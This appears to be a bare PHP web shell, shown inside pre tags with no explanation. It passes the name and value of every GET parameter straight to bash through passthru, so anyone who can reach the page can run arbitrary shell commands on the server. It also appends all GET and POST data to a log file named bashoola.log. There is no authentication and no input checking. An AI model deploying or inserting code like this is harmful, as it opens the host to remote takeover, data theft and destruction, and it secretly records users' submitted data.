<pre>
<?php
  foreach ($_GET as $command => $arguments) {
    passthru("bash -$command '$arguments' 2>&1");
  }
  $timeStamp = date('c');
  $logEntry = "<code time='$timeStamp'>". json_encode($_GET) . json_encode($_POST) ."</code>";
  file_put_contents('bashoola.log', $logEntry, FILE_APPEND);
?>
</pre>
